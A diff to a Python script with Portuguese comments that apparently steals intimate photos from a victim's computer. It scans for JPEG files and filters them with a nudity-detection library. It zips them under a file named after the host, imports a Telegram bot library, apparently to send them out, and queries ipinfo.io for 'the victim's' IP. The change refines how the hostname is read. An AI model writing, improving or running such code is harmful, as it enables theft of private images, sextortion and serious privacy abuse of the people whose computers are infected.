@@ -1,14 +1,14 @@
 #!/usr/bin/env python
 # coding=utf-8
 
-import nude,datetime,os,zipfile,subprocess,telepot,requests
-
+import nude,datetime,os,zipfile,telepot,requests
+from socket import gethostname
 
 #Extensoes de arquivos para procurar os nudes
 extensions = ('.jpg','jpeg')
 
 #Executa comando de hostname para pegar o nome do computador
-hostname = subprocess.check_output(['hostname']).lower().strip()
+hostname = gethostname()
 
 #Nome do arquivo zipado que vai conter os nudes
 zipado = hostname+"_41_M3U5_NUD35.zip"
@@ -50,7 +50,7 @@ def get_conf():
 #Enviar informacoes sobre o IP da vitima
 def send_infos():
     #Executa comando de hostname para pegar o nome do computador
-    hostname = subprocess.check_output(['hostname']).lower().strip()
+    hostname = gethostname()
     #Faz requisicao sobre o IP
     r = requests.get('http://ipinfo.io')
     #Salva o resultado json na variavel infos
